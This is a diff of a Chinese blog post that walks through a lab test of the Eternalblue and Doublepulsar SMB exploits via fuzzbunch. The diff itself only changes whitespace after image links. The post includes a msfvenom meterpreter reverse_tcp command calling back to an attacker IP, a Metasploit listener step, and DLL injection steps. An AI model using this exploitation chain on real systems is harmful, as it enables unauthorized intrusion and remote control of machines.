@@ -30,13 +30,13 @@ keywords: [Enternalblue,Doublepulsar,NSA,SMB,Metasploit]
 #### **2. 测试流程**
 ##### **1）运行 fuzzbunch 框架**
 在 cmd 中进入 windows 目录，运行 `python fb.py`。输入目标系统 IP（Win 7 x86）和攻击机 IP（Win 7 x64），输入“no” 不重定向，接着输入项目名新建一个项目。
-![](http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png)
+![](http://ooyovxue7.bkt.clouddn.com/17-4-28/95094523-file_1493344655277_8614.png)   
 
 ##### **2）调用 Eternalblue 攻击系统**
 运行` use Eternalblue`，然后大多数步骤只需按回车使用默认参数即可。
-![](http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png)
+![](http://ooyovxue7.bkt.clouddn.com/17-4-28/54184530-file_1493344922256_adf5.png)   
 下面需要选择 `1）FB` 模式。
-![](http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png)
+![](http://ooyovxue7.bkt.clouddn.com/17-4-28/61786740-file_1493345114952_f2f3.png)   
 接着继续回车，直到成功运行攻击模块。
 ![](http://ooyovxue7.bkt.clouddn.com/17-4-28/73280707-file_1493345362094_157db.png)
 
@@ -49,13 +49,13 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.109.128 LPORT=6666 -f 
 
 ##### **4）开启 msf 监听**
 在 Kali Linux 下，运行 msf，监听 6666 端口。
-![](http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png)
+![](http://ooyovxue7.bkt.clouddn.com/17-4-28/80220500-file_1493346556508_101d9.png)   
 
 ##### **5）调用 Doublepulsar 注入 DLL**
 回到攻击机中，执行 `use Doublepulsar` ，回车使用默认参数直到选择 Function 为2 注入 DLL，然后指定 DLL 的路径。
-![](http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png)
+![](http://ooyovxue7.bkt.clouddn.com/17-4-28/11038492-file_1493347262266_5c5.png)   
 注入成功后将返回如下信息。
-![](http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png)
+![](http://ooyovxue7.bkt.clouddn.com/17-4-28/68357990-file_1493347997057_2e1f.png)   
 但是这里也会出现个问题，多次注入之后目标系统会出错重启。
 ![](http://ooyovxue7.bkt.clouddn.com/17-4-28/56721083-file_1493348716416_6f00.png)
 
